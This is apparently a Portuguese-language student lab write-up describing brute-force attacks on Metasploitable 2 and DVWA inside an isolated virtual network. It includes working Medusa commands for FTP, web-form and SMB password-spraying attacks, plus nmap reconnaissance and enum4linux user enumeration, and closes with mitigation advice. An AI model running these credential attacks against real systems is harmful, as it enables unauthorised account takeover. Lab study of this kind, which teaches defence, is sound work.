# 🛡️ Laboratório de Segurança Ofensiva: Exploração do Metasploitable 2 & DVWA

[](https://www.google.com/search?q=LICENSE)
[](https://python.org)
[](https://github.com)
[](https://www.google.com/search?q=LICENSE)

> **⚠️ AVISO LEGAL:** Todo o conteúdo deste repositório foi produzido exclusivamente em ambiente controlado e isolado, com fins educacionais. A execução de ataques sem autorização explícita é crime (Lei nº 12.737/2012 — Lei Carolina Dieckmann, e art. 154-A do Código Penal Brasileiro). **Nunca replique estas técnicas em sistemas reais sem permissão.**

-----

## 📋 Índice

  - [Visão Geral](https://www.google.com/search?q=%23-vis%C3%A3o-geral)
  - [Ambiente de Laboratório](https://www.google.com/search?q=%23-ambiente-de-laborat%C3%B3rio)
  - [O que é Força Bruta?](https://www.google.com/search?q=%23-o-que-%C3%A9-for%C3%A7a-bruta)
  - [Ferramentas Utilizadas](https://www.google.com/search?q=%23-ferramentas-utilizadas)
  - [Cenário 1 — Ataque FTP (Metasploitable 2)](https://www.google.com/search?q=%23-cen%C3%A1rio-1--ataque-ftp-metasploitable-2)
  - [Cenário 2 — Força Bruta Web (DVWA)](https://www.google.com/search?q=%23-cen%C3%A1rio-2--for%C3%A7a-bruta-web-dvwa)
  - [Cenário 3 — Password Spraying em SMB](https://www.google.com/search?q=%23-cen%C3%A1rio-3--password-spraying-em-smb)
  - [Wordlists Utilizadas](https://www.google.com/search?q=%23-wordlists-utilizadas)
  - [Medidas de Mitigação](https://www.google.com/search?q=%23-medidas-de-mitiga%C3%A7%C3%A3o)
  - [Referências](https://www.google.com/search?q=%23-refer%C3%AAncias)

-----

## 🌐 Visão Geral

Este projeto documenta um laboratório prático de **segurança ofensiva**, simulando ataques de força bruta em diferentes serviços usando o **Kali Linux** e o **Medusa** como ferramentas principais. O objetivo não é invadir sistemas — é **entender como os atacantes pensam** para, assim, construir defesas mais robustas.

-----

## 🖥️ Ambiente de Laboratório

### 🏗️ Arquitetura do Laboratório

```text
┌─────────────────────┐         ┌──────────────────────────┐
│   Kali Linux        │◄───────►│   Metasploitable2        │
│   (Atacante)        │  Host-  │   (Alvo — FTP/SMB)       │
│   10.10.10.10       │  Only   │   10.10.10.20            │
└─────────────────────┘         └──────────────────────────┘
         │                                    │
         │                        ┌───────────┴─────────────┐
         │                        │  DVWA (Web App)         │
         └────────────────────────│  http://10.10.10.20/dvwa│
                                  └─────────────────────────┘
```

#### Configuração

| Componente       | Configuração                               |
| :--------------- | :----------------------------------------- |
| **Hypervisor** | KVM / QEMU                                 |
| **Rede** | Host-Only Adapter (`seclab-isolated`)      |
| **VM Atacante** | Kali Linux — 2 vCPUs / 4GB RAM             |
| **VM Alvo** | Metasploitable2 — 1 vCPU / 512MB RAM       |
| **Isolamento** | ✅ Sem acesso à internet durante os testes |

#### 🌐 Topologia de Rede Virtual

O cenário utiliza uma rede isolada do tipo `seclab-isolated` (sem NAT para a internet) para garantir que nenhum tráfego de exploração saia do host local.

**Configuração do XML da Rede (`seclab-isolated.xml`):**

```xml
<network>
  <name>seclab-isolated</name>
  <bridge name='virbr-iso' stp='on' delay='0'/>
  <mac address='52:54:00:be:ef:01'/>
  <ip address='10.10.10.1' netmask='255.255.255.0'>
    <dhcp>
      <range start='10.10.10.100' end='10.10.10.200'/>
      <host mac='52:54:00:be:ef:10' name='kali-attacker' ip='10.10.10.10'/>
      <host mac='52:54:00:be:ef:20' name='ms2-target' ip='10.10.10.20'/>
    </dhcp>
  </ip>
</network>
```

  * **Comandos de ativação:**
    ```bash
    virsh net-define seclab-isolated.xml
    virsh net-start seclab-isolated
    virsh net-autostart seclab-isolated
    ```

-----

### 🛠️ Stack de Ferramentas e Protocolos

| Categoria | Ferramenta | Aplicação |
| :--- | :--- | :--- |
| **Virtualização** | KVM / Virt-Manager | Gestão das máquinas alvo e atacante. |
| **Reconhecimento** | Nmap | Mapeamento de portas e fingerprinting de serviços. |
| **Brute Force** | Medusa | Ataques modulares e paralelos (FTP, SSH, SMB, HTTP). |
| **Enumeração SMB** | Enum4linux-ng | Extração de SIDs, shares e listas de usuários. |

-----

## 🧠 O que é Força Bruta?

Um **ataque de força bruta** (*brute force attack*) é uma técnica de descoberta de credenciais que funciona de forma simples e implacável: **tentar todas as combinações possíveis** de usuário e senha até que uma funcione.

Pense assim: se você perdeu o cadeado de 4 dígitos da sua mala, pode tentar de `0000` a `9999` — são 10.000 tentativas, mas você **certamente** vai achar a combinação certa. Ataques de força bruta fazem exatamente isso, mas com velocidade computacional.

### Variantes do Ataque

| Tipo | Descrição | Quando usar |
| :--- | :--- | :--- |
| **Brute Force Puro** | Testa todas as combinações possíveis | Senhas curtas/simples |
| **Dictionary Attack** | Usa uma lista de senhas comuns (wordlist) | Senhas em linguagem humana |
| **Password Spraying** | Testa 1 senha contra muitos usuários | Evitar bloqueio de conta |
| **Credential Stuffing** | Usa credenciais vazadas de outros serviços | Reuso de senhas |

-----

## 🛠️ Ferramentas Utilizadas

### Medusa

O **Medusa** é uma ferramenta de força bruta paralela e modular, projetada para ser rápida e confiável.

**Sintaxe básica:**

```bash
medusa -h <HOST> -u <USUÁRIO> -P <WORDLIST> -M <MÓDULO> [opções]
```

| Parâmetro | Descrição |
| :--- | :--- |
| `-h` | Host alvo |
| `-U` | Arquivo com lista de usuários |
| `-P` | Arquivo com lista de senhas (wordlist) |
| `-M` | Módulo/protocolo (ftp, ssh, smb, http...) |
| `-t` | Número de threads paralelas |
| `-f` | Para no primeiro sucesso |

-----

## 🎯 Cenário 1 — Ataque FTP (Metasploitable 2)

### Contexto

O **FTP (File Transfer Protocol)** é amplamente utilizado para transferência de arquivos, porém, por padrão, transmite credenciais em **texto puro**. O Metasploitable 2 expõe este serviço de forma vulnerável para fins de estudo.

### Fase 1: Reconhecimento

```bash
nmap -p 21 -sV 10.10.10.20
```

**Saída esperada:**

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

*Figura 01. Fase de reconhecimento de serviços utilizando NMAP.*
[Fase de reconhecimento de serviços utilizando NMAP](images/lab-sec-01-fase-reconhecimento.png)

### Fase 2: Executando o Ataque

```bash
medusa -h 10.10.10.20 -u msfadmin -P wordlist_senhas.txt -M ftp -t 5 -f -v 4
```

### Saída Esperada (Sucesso)

```text
ACCOUNT FOUND: [ftp] Host: 10.10.10.20 User: msfadmin Password: msfadmin [SUCCESS]
```

*Figura 02. Fase de execução de ataque ao serviço FTP.*
[Fase de execução de ataque ao serviço FTP.](images/lab-sec-02-ataque-ao-servico-ftp.png)

-----

## 🌍 Cenário 2 — Força Bruta Web (DVWA)

### Contexto

O **DVWA (Damn Vulnerable Web Application)** simula um formulário de login web. O objetivo é automatizar as tentativas de autenticação via requisições HTTP.

### Fase 1: Analisar a Requisição HTTP

Inspecione manualmente o formulário para identificar os campos `username` e `password`.

*Figura 03. Inspeção de requisições via DevTools.*
[Inspeção de requisições na página de login do DVWA](images/lab-sec-03-inspecionando-pagina-login-dvwa.png)

### Fase 2: Executando com Medusa

```bash
medusa -h 10.10.10.20 \
       -U user.txt \
       -P senhas.txt \
       -M http \
       -m PAGE:'/dvwa/login.php' \
       -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
       -m PAGE:'FAIL=Login' \
       -t 6
```

*Figura 04. Execução de ataque de força bruta via HTTP FORM.*
[Execução de ataque de força bruta com Medusa no DVWA](images/lab-sec-04-ataque-ao-dvwa-com-medusa.png)

-----

## 🔗 Cenário 3 — Password Spraying em SMB

### Contexto

O **Password Spraying** tenta uma única senha contra uma lista massiva de usuários para evitar o bloqueio de contas por excesso de tentativas em um único perfil.

### Fase 1: Enumeração de Usuários

```bash
enum4linux -U 10.10.10.20 | grep "user:" | cut -d[ -f2 | cut -d] -f1 > smb_users.txt
```

*Figura 05. Exemplo de uso do ENUM4LINUX.*
[Execução da ferramenta enum4linux para enumeração de SMB e serviços Windows](images/lab-sec-05-exemplo-de-uso-do-enum4linux.png)

### Fase 2: Execução do Spraying

```bash
medusa -h 10.10.10.20 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 1 -v 4
```

*Figura 08. Validação do sucesso no ataque ao serviço SMB.*
[Sucesso e validação das credenciais obtidas no ataque ao serviço SMB com Medusa](images/lab-sec-08-ataque-ao-smb-com-medusa-pt02.png)

-----

## 🛡️ Medidas de Mitigação

### Estratégias de Defesa

| Categoria | Medida Recomendada | Implementação |
| :--- | :--- | :--- |
| **Geral** | **MFA (Multi-Factor Auth)** | Implementar segundo fator de autenticação. |
| **Web** | **Rate Limiting** | Bloquear IPs após X tentativas falhas (ex: Fail2Ban). |
| **Infra** | **Senhas Fortes** | Política de complexidade (mín. 12 caracteres). |
| **Protocolo** | **Criptografia** | Migrar de FTP para SFTP; desabilitar SMBv1. |

### Pirâmide de Defesa

```text
                    ▲
                   / \
                  /MFA\   <-- Camada Crítica
                 /-----\
                /Senhas \
               / Fortes  \
              /-----------\
             /Rate Limiting\
            /---------------\
           /  Monitoramento  \
          /___________________\
```

-----

## 📚 Referências

  - [Documentação oficial do Medusa](http://foofus.net/goons/jmk/medusa/medusa.html)
  - [OWASP — Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
  - [NIST SP 800-63B — Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
  - [Lei nº 12.737/2012 — Lei Carolina Dieckmann](https://www.planalto.gov.br/ccivil_03/_ato2011-2014/2012/lei/l12737.htm)

-----

## 👨‍💻 Sobre o Projeto

Este repositório foi desenvolvido como entrega do desafio prático de **Segurança Ofensiva** da [DIO — Digital Innovation One](https://www.dio.me).
